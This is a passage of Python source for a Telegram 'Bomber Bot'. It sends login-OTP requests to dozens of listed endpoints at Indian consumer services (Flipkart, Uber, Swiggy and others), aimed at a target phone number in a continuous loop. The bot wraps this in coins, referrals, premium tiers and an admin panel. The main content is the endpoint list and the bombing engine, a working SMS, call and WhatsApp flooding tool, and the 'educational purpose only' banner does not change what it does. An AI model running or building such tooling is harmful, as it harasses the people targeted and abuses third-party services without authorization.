    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Cred Call', 'url': 'https://cred.club/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Tatacapital WhatsApp', 'url': 'https://tatacapital.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
]

# Convert ULTIMATEAPIS to standard APIS format and merge
for _a in ULTIMATEAPIS:
    APIS.append({
        "name": _a["name"],
        "url": (lambda u: (lambda p, d: u))(_a["url"]),
        "method": _a["method"],
        "headers": _a["headers"],
        "data": (lambda f: (lambda p, d: f(p)))(_a["data"]),
    })

# ----------------------------- BOMBING ENGINE -----------------------------
async def send_bomb_req(session, api, phone):
    try:
        url = api["url"](phone, 0)
        headers = api.get("headers", {})
        method = api["method"]
        data = api["data"](phone, 0) if "data" in api else None
        if isinstance(data, dict):
            ct = headers.get("Content-Type", "").lower()
            data = json.dumps(data) if "json" in ct else "&".join(f"{k}={v}" for k, v in data.items())
        if method.upper() == "GET":
            async with session.get(url, headers=headers, timeout=30) as r:
                return api["name"], r.status, None
        async with session.post(url, headers=headers, data=data, timeout=30) as r:
            return api["name"], r.status, None
    except Exception as e:
        return api["name"], None, str(e)

async def run_bombing(chat_id, phone, update, context):
    stop_msg, round_num, total_ok, total_fail = None, 0, 0, 0
    try:
        msg = f"🔥 <b>Bombing started</b> on <code>{escape(phone)}</code>\n🔄 <b>Continuous mode</b> – will run until you press <b>Stop Bombing</b>.\n⏳ Sending continuous requests..."
        if update.callback_query: await update.callback_query.message.reply_text(stylish_text(msg), parse_mode="HTML")
        else: await update.message.reply_text(stylish_text(msg), parse_mode="HTML")
        stop_msg = await context.bot.send_message(chat_id, "🛑 <b>Bombing is active</b>\nPress the button below to stop.",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[cb("🛑 Stop Bombing", callback_data="stop_bomb", style="danger")]]))
        start = time.time()
        async with aiohttp.ClientSession() as session:
            while True:
                round_num += 1
                results = await asyncio.gather(*[send_bomb_req(session, a, phone) for a in APIS])
                ok = sum(1 for r in results if r[1] and 200 <= r[1] < 300)
                total_ok += ok; total_fail += len(results) - ok
                if round_num % 5 == 0:
                    await context.bot.send_message(chat_id,
                        f"🔄 <b>Bombing in progress...</b>\n📞 Target: <code>{escape(phone)}</code>\n⏱️ Running for: {int(time.time()-start)}s\n"
                        f"✅ Successful requests: {total_ok}\n❌ Failed: {total_fail}\n📡 Round #{round_num} completed.\n🛑 Press Stop Bombing to end.", parse_mode="HTML")
                await asyncio.sleep(3)
                if asyncio.current_task().cancelled(): break
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id,
            f"🛑 <b>Bombing stopped by user</b>\n📞 Target: <code>{escape(phone)}</code>\n🔄 Total Rounds: {round_num}\n"
            f"✅ Total Successful Requests: {total_ok}\n❌ Total Failed: {total_fail}\n📊 Average per Round: {total_ok//round_num if round_num>0 else 0}", parse_mode="HTML")
        if stop_msg:
            await context.bot.edit_message_text("✅ <b>Bombing has been stopped.</b>", chat_id=stop_msg.chat_id, message_id=stop_msg.message_id, parse_mode="HTML")
        raise
    finally:
        active_tasks.pop(chat_id, None)

async def admin_add_coins(uid, amt, context):
    await update_coins(uid, amt); bal = await get_coins(uid)
    try: await context.bot.send_message(uid, f"🎉 Admin added <b>{amt}</b> coin(s).\n💰 New balance: <code>{bal}</code> coins.", parse_mode="HTML")
    except: pass
    return bal
async def admin_remove_coins(uid, amt, context):
    cur = await get_coins(uid)
    if cur < amt: return False, cur
    await update_coins(uid, -amt); bal = await get_coins(uid)
    try: await context.bot.send_message(uid, f"⚠️ Admin removed <b>{amt}</b> coin(s).\n💰 New balance: <code>{bal}</code> coins.", parse_mode="HTML")
    except: pass
    return True, bal
async def admin_give_premium(uid, days, context):
    await set_premium(uid, days); exp = datetime.fromtimestamp(await get_expiry(uid)).strftime("%Y-%m-%d %H:%M:%S")
    try: await context.bot.send_message(uid, f"👑 Admin granted you <b>{days}</b> days of premium!\n📅 Expires on: {exp}", parse_mode="HTML")
    except: pass
    return f"✅ Granted {days} days premium to user {uid}. Expires: {exp}"
async def admin_remove_premium(uid, context):
    await remove_premium(uid)
    try: await context.bot.send_message(uid, "⚠️ Your premium subscription has been removed by admin.", parse_mode="HTML")
    except: pass
    return f"✅ Removed premium from user {uid}"

# ----------------------------- HANDLERS -----------------------------
async def start(update, context):
    global bot_username
    if not bot_username: bot_username = (await context.bot.get_me()).username
    u = update.effective_user
    args = context.args
    if not await get_user(u.id):
        rid = None
        if args and args[0].startswith('ref_'):
            row = await q('SELECT user_id FROM users WHERE referral_code=?', (args[0][4:],), 'one')
            if row and row[0] != u.id: rid = row[0]
        await create_user(u.id, u.username or "", u.first_name or "", u.last_name or "", rid)
        if rid:
            await q('UPDATE users SET coins=coins+1, referred_count=referred_count+1 WHERE user_id=?', (rid,), commit=True)
            try: await context.bot.send_message(rid, f"🎉 You earned 1 coin! Someone used your referral link.\n💰 New balance: {await get_coins(rid)} coins.")
            except: pass
    ok, missing = await check_membership(u.id, context)
    if not ok:
        await send_force_subscribe_message(update.effective_chat.id, context, missing); return
    await show_main_menu(update, context)

async def show_main_menu(update, context, edit=False):
    uid = update.effective_user.id
    kbd = [
        [cb("💣 Start Bombing", callback_data="start_bomb", style="success"), cb("🛑 Stop Bombing", callback_data="stop_bomb", style="danger")],
        [cb("💰 Refer & Earn", callback_data="refer_info", style="success"), cb("👑 Premium", callback_data="premium_info", style="success")],
        [cb("🛡️ PROTECT", callback_data="protect_menu", style="success"), cb("🎫 Redeem Code", callback_data="redeem_code", style="success")],
        [cb("ℹ️ My Info", callback_data="my_info", style="primary"), cb("📞 Contact", url="https://t.me/dg_drift", style="primary")]
    ]
    if uid == ADMIN_CHAT_ID: kbd.append([cb("👑 Admin Panel", callback_data="admin_panel", style="primary")])
    txt = ("━━━━━━━━━━━━━━━━━━━━━\n   🔥 <b>WELCOME TO BOMBER BOT</b> 🔥\n━━━━━━━━━━━━━━━━━━━━━\n\n"
           "Click <b>Start Bombing</b> and send me a phone number.\nExample: <code>9876543210</code>\n\n"
           "⚠️ <b>WARNING</b>\nEducational purpose only. Misuse may violate laws.\n━━━━━━━━━━━━━━━━━━━━━")
    if edit and update.callback_query: await update.callback_query.edit_message_text(stylish_text(txt), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kbd))
    else: await update.message.reply_text(stylish_text(txt), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kbd))

async def protect_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    if not context.args:
        await update.message.reply_text("❌ Usage: <code>/protect &lt;phone_number&gt;</code>", parse_mode="HTML"); return
    p = clean_phone(context.args[0])
    if len(p) < 10: await update.message.reply_text("❌ Invalid phone number."); return
    if await add_protection(uid, p): await update.message.reply_text(f"✅ Number <code>{p}</code> has been added to your protection list.", parse_mode="HTML")
    else: await update.message.reply_text(f"⚠️ Number <code>{p}</code> is already in your protection list.", parse_mode="HTML")

async def unprotect_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    if not context.args: await update.message.reply_text("❌ Usage: <code>/unprotect &lt;phone_number&gt;</code>", parse_mode="HTML"); return
    p = clean_phone(context.args[0])
    if await remove_protection(uid, p): await update.message.reply_text(f"✅ Number <code>{p}</code> removed from your protection list.", parse_mode="HTML")
    else: await update.message.reply_text(f"⚠️ Number <code>{p}</code> was not in your protection list.", parse_mode="HTML")

async def myprotects_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    pl = await get_protections(uid)
    if not pl: await update.message.reply_text("📭 You have no protected numbers. Use /protect <number> to add one."); return
    await update.message.reply_text("🛡️ <b>Your Protected Numbers</b>\n\n" + "\n".join(f"• <code>{n}</code>" for n in pl) + "\n\nUse /unprotect <number> to remove.", parse_mode="HTML")

async def my_info(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    d = await get_user(uid)
    if not d: await update.message.reply_text("Error retrieving your data."); return
    _, un, fn, ln, _, _, coins, refs, pu = d
    ps = "✅ Active" if pu > int(time.time()) else "❌ Inactive"
    if pu > 0: ps += f" (expires in {max(0,(pu-int(time.time()))//86400)} days)"
    await update.message.reply_text(
        f"📌 <b>Your Info</b>\n🆔 <b>User ID:</b> <code>{uid}</code>\n👤 <b>Name:</b> {escape((fn+' '+ln).strip())}\n"
        f"🔖 <b>Username:</b> @{escape(un) if un else 'None'}\n💰 <b>Coins:</b> {coins}\n👥 <b>Referrals:</b> {refs}\n"
        f"👑 <b>Premium:</b> {ps}\n\n✨ Use /premium to buy premium with coins.", parse_mode="HTML")

async def premium_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    bal = await get_coins(uid); isp = await is_premium(uid); exp = await get_expiry(uid)
    st = "✅ <b>Active</b>" if isp else "❌ <b>Inactive</b>"
    if isp and exp > 0: st += f" (expires in {(exp-int(time.time()))//86400} days)"
    txt = (f"👑 <b>Premium Subscription</b>\n\nYour status: {st}\n💰 Your coins: {bal}\n\n<b>Benefits:</b>\n"
           "• Bombing costs <b>0 coins</b>\n• <b>No duration limit</b> – bomb continuously until you stop\n\n"
           "<b>Prices:</b>\n• 7 days  → 50 coins\n• 30 days → 100 coins\n\nSelect an option below:")
    kbd = [[InlineKeyboardButton("7 Days (50 coins)", callback_data="buy_premium_7")],
           [InlineKeyboardButton("30 Days (100 coins)", callback_data="buy_premium_30")],
           [cb("🔙 Back", callback_data="main_menu")]]
    await update.message.reply_text(stylish_text(txt), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kbd))

async def _start_bombing(update, context, phone_digits, via_button=False):
    uid = update.effective_user.id
    if await is_gp(phone_digits): await update.effective_chat.send_message(f"🛡️ <b>This number is protected by admin</b>\nBombing on <code>{phone_digits}</code> is not allowed.", parse_mode="HTML"); return False
    if await is_protected(uid, phone_digits): await update.effective_chat.send_message(f"🛡️ You have protected number <code>{phone_digits}</code>. I will not bomb it.", parse_mode="HTML"); return False
    chat_id = update.effective_chat.id
    if chat_id in active_tasks and not active_tasks[chat_id].done(): await update.effective_chat.send_message("⚠️ You already have an active bombing. Use Stop button first."); return False
    prem = await is_premium(uid)
    if not prem and uid != ADMIN_CHAT_ID:
        if await get_coins(uid) < 1:
            await update.effective_chat.send_message("❌ You don't have enough coins! Earn coins by referring friends or buy premium.\nUse /premium to see benefits.\nUse /refer to get your referral link."); return False
        await update_coins(uid, -1)
        await update.effective_chat.send_message(f"💸 1 coin deducted. Remaining coins: {await get_coins(uid)}")
    active_tasks[chat_id] = asyncio.create_task(run_bombing(chat_id, phone_digits, update, context))
    return True

async def bomb_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    ok, missing = await check_membership(uid, context)
    if not ok: await send_force_subscribe_message(update.effective_chat.id, context, missing); return
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: <code>/bomb &lt;phone_number&gt;</code>\nExample: <code>/bomb 9876543210</code>", parse_mode="HTML"); return
    p = clean_phone(context.args[0])
    if not p: await update.message.reply_text("❌ Invalid phone number."); return
    await _start_bombing(update, context, p)

async def stop_bombing(update, context):
    chat_id = update.effective_chat.id
    if chat_id in active_tasks and not active_tasks[chat_id].done():
        active_tasks[chat_id].cancel(); await update.message.reply_text("🛑 Stopping bombing... Please wait.")
    else: await update.message.reply_text("❌ No active bombing to stop.")

async def admin_panel(update, context):
    if update.effective_user.id != ADMIN_CHAT_ID: await update.message.reply_text("⛔ You are not authorized."); return
    kbd = [[cb("➕ Add Coins", callback_data="admin_add_coins", style="success")],
           [cb("➖ Remove Coins", callback_data="admin_remove_coins", style="danger")],
           [cb("🎫 Create Redeem Code", callback_data="admin_create_code", style="success")],
           [cb("👑 Give Premium", callback_data="admin_give_premium", style="success")],
           [cb("❌ Remove Premium", callback_data="admin_remove_premium", style="danger")],
           [cb("➕ Add Global Protect", callback_data="admin_add_global_protect", style="success")],
           [cb("➖ Remove Global Protect", callback_data="admin_remove_global_protect", style="danger")],
           [cb("📋 List Global Protects", callback_data="admin_list_global_protects", style="success")],
           [cb("📢 Broadcast", callback_data="admin_broadcast", style="primary")],
           [cb("❌ Close", callback_data="admin_close", style="danger")]]
    await update.message.reply_text("👑 <b>Admin Panel</b>\nChoose an action:", parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kbd))

async def create_code_command(update, context):
    if update.effective_user.id != ADMIN_CHAT_ID: await update.message.reply_text("⛔ Unauthorized."); return
    if len(context.args) != 2 or not all(a.isdigit() for a in context.args):
        await update.message.reply_text("❌ Usage: <code>/createcode &lt;amount&gt; &lt;max_uses&gt;</code>", parse_mode="HTML"); return
    amt, mx = map(int, context.args)
